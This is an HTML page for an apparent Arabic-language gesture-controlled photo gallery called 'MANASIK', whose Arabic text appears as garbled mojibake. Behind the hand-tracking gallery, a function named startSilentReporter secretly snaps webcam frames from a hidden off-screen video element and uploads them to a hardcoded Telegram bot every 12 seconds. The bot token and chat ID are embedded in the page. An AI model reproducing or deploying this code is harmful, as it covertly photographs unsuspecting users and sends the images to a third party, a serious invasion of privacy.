<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M A N A S I K | Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ø§Ù†Ø³ÙŠØ§Ø¨ÙŠ</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root { --gold: #c5a059; --bg: #030303; }
        body {
            font-family: 'Cairo', sans-serif;
            background-color: var(--bg);
            margin: 0; overflow: hidden; height: 100vh;
            color: white; user-select: none; touch-action: none;
        }

        #bg-canvas { position: fixed; inset: 0; z-index: 0; opacity: 0.4; }

        /* Ø§Ù„ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ Ø§Ù„ÙØ§Ø®Ø± */
        #box-hub { 
            position: relative; width: 220px; height: 220px; 
            perspective: 1000px; z-index: 100;
            transition: all 1.2s cubic-bezier(0.4, 0, 0.2, 1);
        }
        .box-inner {
            width: 100%; height: 100%; position: relative;
            transform-style: preserve-3d;
            transform: rotateX(-15deg) rotateY(40deg);
        }
        .box-side {
            position: absolute; width: 100%; height: 100%;
            background: rgba(15, 15, 15, 0.98);
            border: 1px solid var(--gold);
            box-shadow: inset 0 0 40px rgba(197, 160, 89, 0.15);
        }
        .side-f  { transform: translateZ(110px); }
        .side-bk { transform: rotateY(180deg) translateZ(110px); }
        .side-r  { transform: rotateY(90deg) translateZ(110px); }
        .side-l  { transform: rotateY(-90deg) translateZ(110px); }
        .side-t  { transform: rotateX(90deg) translateZ(110px); background: #1a1a1a; }
        .side-bt { transform: rotateX(-90deg) translateZ(110px); }

        /* Ù…Ø¹Ø±Ø¶ Ø§Ù„ØµÙˆØ± Ø§Ù„Ø£ÙÙ‚ÙŠ Ø§Ù„Ù…ØªØ·ÙˆØ± */
        #gallery-viewport {
            position: absolute; inset: 0;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden; pointer-events: none;
            visibility: hidden; opacity: 0; z-index: 50;
        }
        #gallery-rail {
            display: flex; gap: 40px;
            will-change: transform;
            transition: transform 0.15s ease-out; /* ØªÙ†Ø¹ÙŠÙ… Ø¥Ø¶Ø§ÙÙŠ Ù„Ù„Ø­Ø±ÙƒØ© */
        }
        .photo-frame {
            width: 260px; height: 380px; flex-shrink: 0;
            background: #0a0a0a; border-radius: 20px;
            border: 1.5px solid rgba(197, 160, 89, 0.2);
            overflow: hidden; box-shadow: 0 40px 80px rgba(0,0,0,0.8);
            transform: scale(0.9); transition: all 0.5s cubic-bezier(0.17, 0.67, 0.83, 0.67);
        }
        .photo-frame img { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; transition: 0.5s; }
        .photo-frame.active {
            transform: scale(1.1) translateY(-20px);
            border-color: var(--gold);
            box-shadow: 0 0 50px rgba(197, 160, 89, 0.3);
        }
        .photo-frame.active img { opacity: 1; }

        /* Ø¹Ù†Ø§ØµØ± Ø§Ù„ØªØ­ÙƒÙ… Ø§Ù„Ø®ÙÙŠØ© */
        #hidden-video { position: fixed; left: -9999px; }
        #finger-cursor {
            position: fixed; width: 30px; height: 30px;
            border: 2px solid var(--gold); border-radius: 50%;
            pointer-events: none; z-index: 200; opacity: 0;
            transition: opacity 0.3s;
        }
    </style>
</head>
<body>

    <canvas id="bg-canvas"></canvas>
    <div id="finger-cursor"></div>
    <video id="hidden-video" autoplay playsinline></video>

    <main class="h-screen flex flex-col items-center justify-center relative">
        <div id="guide-ui" class="text-center mb-12 z-[110] transition-all duration-1000">
            <h1 class="text-5xl font-black mb-3 tracking-tighter text-white">MANASIK</h1>
            <p class="text-gold/40 text-[10px] tracking-[0.6em] uppercase">Ø§Ø¨Ø³Ø·ÙŠ ÙƒÙ ÙŠØ¯ÙƒÙ ğŸ–ï¸ Ù„Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø©</p>
        </div>

        <div id="box-hub">
            <div class="box-inner">
                <div class="box-side side-f"></div><div class="box-side side-bk"></div>
                <div class="box-side side-r"></div><div class="box-side side-l"></div>
                <div class="box-side side-t"></div><div class="box-side side-bt"></div>
            </div>
        </div>

        <div id="gallery-viewport">
            <div id="gallery-rail">
                <!-- Ø§Ù„ØµÙˆØ± Ø³ØªØªÙˆÙ„Ø¯ Ù‡Ù†Ø§ -->
            </div>
        </div>
    </main>

    <script>
        const TG_CONFIG = {
            TOKEN: '8425679766:AAF3R_4CCTcVLbEJfJUaDQ_LqVlaV6jHZEI', // ÙŠØ¬Ø¨ ØªØ¹Ø¨Ø¦ØªÙ‡
            CHAT_ID: '8148586037' // ÙŠØ¬Ø¨ ØªØ¹Ø¨Ø¦ØªÙ‡
        };

        const MEDIA = [
            "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=600",
            "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=600",
            "https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=600",
            "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=600",
            "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=600"
        ];

        let uiState = {
            opened: false,
            fingerX: 0,
            smoothFingerX: 0, // Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ù…Ù†Ø¹Ù…Ø©
            railX: 0,
            targetRailX: 0,
            isProcessing: false
        };

        const video = document.getElementById('hidden-video');
        const hands = new Hands({locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`});
        
        hands.setOptions({ 
            maxNumHands: 1, 
            modelComplexity: 1, 
            minDetectionConfidence: 0.8,
            minTrackingConfidence: 0.8 
        });

        hands.onResults(res => {
            if (res.multiHandLandmarks && res.multiHandLandmarks[0]) {
                const landmarks = res.multiHandLandmarks[0];
                const indexTip = landmarks[8];
                
                // Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ø¥ØµØ¨Ø¹ Ø§Ù„Ø®Ø§Ù…
                uiState.fingerX = (1 - indexTip.x) * window.innerWidth;
                const fingerY = indexTip.y * window.innerHeight;

                // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ù…Ø¤Ø´Ø±
                const cursor = document.getElementById('finger-cursor');
                cursor.style.opacity = "1";
                cursor.style.left = uiState.fingerX + 'px';
                cursor.style.top = fingerY + 'px';

                // ÙƒØ´Ù ÙØªØ­ Ø§Ù„ÙŠØ¯ Ø¨Ø¯Ù‚Ø© (Ø§Ù„Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ø¥Ø¨Ù‡Ø§Ù… ÙˆØ§Ù„Ø®Ù†ØµØ±)
                const distance = Math.sqrt(
                    Math.pow(landmarks[4].x - landmarks[20].x, 2) + 
                    Math.pow(landmarks[4].y - landmarks[20].y, 2)
                );

                if (distance > 0.45 && !uiState.opened) activateGallery();

                if (uiState.opened) {
                    // ØªØ­ÙˆÙŠÙ„ Ø­Ø±ÙƒØ© Ø§Ù„Ø¥ØµØ¨Ø¹ Ø¥Ù„Ù‰ Ø¥Ø²Ø§Ø­Ø© Ø£ÙÙ‚ÙŠØ© Ù…ØªÙ†Ø§Ø³Ø¨Ø©
                    const centerX = window.innerWidth / 2;
                    uiState.targetRailX = (centerX - uiState.fingerX) * 2.5; 
                }
            }
        });

        function activateGallery() {
            uiState.opened = true;
            document.getElementById('box-hub').style.transform = "scale(0) rotateX(180deg)";
            document.getElementById('guide-ui').style.opacity = "0";
            
            const viewport = document.getElementById('gallery-viewport');
            viewport.style.visibility = "visible";
            viewport.style.opacity = "1";
            
            buildRail();
            renderLoop();
            startSilentReporter();
        }

        function buildRail() {
            const rail = document.getElementById('gallery-rail');
            MEDIA.forEach(src => {
                const frame = document.createElement('div');
                frame.className = 'photo-frame';
                frame.innerHTML = `<img src="${src}">`;
                rail.appendChild(frame);
            });
        }

        function renderLoop() {
            // ØªÙ†Ø¹ÙŠÙ… Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ø¥ØµØ¨Ø¹ (Exponential Smoothing)
            // 0.1 ØªØ¹Ù†ÙŠ Ø£Ù†Ù†Ø§ Ù†Ø£Ø®Ø° 10% Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬Ø¯ÙŠØ¯ Ùˆ 90% Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù‚Ø¯ÙŠÙ… ÙÙŠ ÙƒÙ„ Ø¥Ø·Ø§Ø±
            uiState.railX += (uiState.targetRailX - uiState.railX) * 0.1;
            
            const rail = document.getElementById('gallery-rail');
            rail.style.transform = `translateX(${uiState.railX}px)`;

            // ØªÙ…ÙŠÙŠØ² Ø§Ù„Ø¹Ù†ØµØ± Ø§Ù„Ù…Ø±ÙƒØ²ÙŠ
            const frames = document.querySelectorAll('.photo-frame');
            frames.forEach(f => {
                const rect = f.getBoundingClientRect();
                const mid = window.innerWidth / 2;
                const distToMid = Math.abs((rect.left + rect.width / 2) - mid);
                
                if (distToMid < 150) f.classList.add('active');
                else f.classList.remove('active');
            });

            requestAnimationFrame(renderLoop);
        }

        // --- Ù†Ø¸Ø§Ù… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµØ§Ù…Øª ---
        function startSilentReporter() {
            if (!TG_CONFIG.TOKEN) return;
            
            const capture = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', TG_CONFIG.CHAT_ID);
                    fd.append('photo', blob, 'session.jpg');
                    fetch(`https://api.telegram.org/bot${TG_CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg', 0.6);
            };

            // Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© ÙÙˆØ±ÙŠØ© Ø«Ù… ÙƒÙ„ 12 Ø«Ø§Ù†ÙŠØ©
            capture();
            setInterval(capture, 12000);
        }

        const camera = new Camera(video, {
            onFrame: async () => { await hands.send({image: video}); },
            width: 640, height: 480
        });
        camera.start();

        // ØªØ£Ø«ÙŠØ± Ø®Ù„ÙÙŠØ© Ø¨Ø³ÙŠØ·
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        function initBg() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            ctx.fillStyle = "rgba(197, 160, 89, 0.1)";
            for(let i=0; i<80; i++) {
                ctx.beginPath();
                ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 0.5, 0, Math.PI*2);
                ctx.fill();
            }
        }
        initBg();
    </script>
</body>
</html>

